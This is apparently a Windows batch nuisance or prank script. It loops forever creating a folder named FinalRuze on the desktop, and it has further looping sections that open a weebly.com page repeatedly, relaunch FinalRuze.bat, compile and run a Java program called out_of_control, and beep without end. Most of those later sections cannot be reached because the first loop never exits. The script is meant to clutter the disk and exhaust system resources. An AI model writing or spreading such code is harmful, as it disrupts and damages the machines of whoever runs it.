@echo off
cd desktop
:x
md FinalRuze
goto x

:loop1
Start https://j26nabr4tcsw908qiu.weebly.com/
Start https://j26nabr4tcsw908qiu.weebly.com/
Start FinalRuze.bat

set java_path=C:\Program Files\Java\jdk1.8.0_221\bin
set java_file=out_of_control.java

"%java_path%\javac" %java_file%

:start
"%java_path%\java" out_of_control

goto loop1

:loop2
PowerShell -Command "[System.Media.SystemSounds]::Beep.Play()"
goto loop2
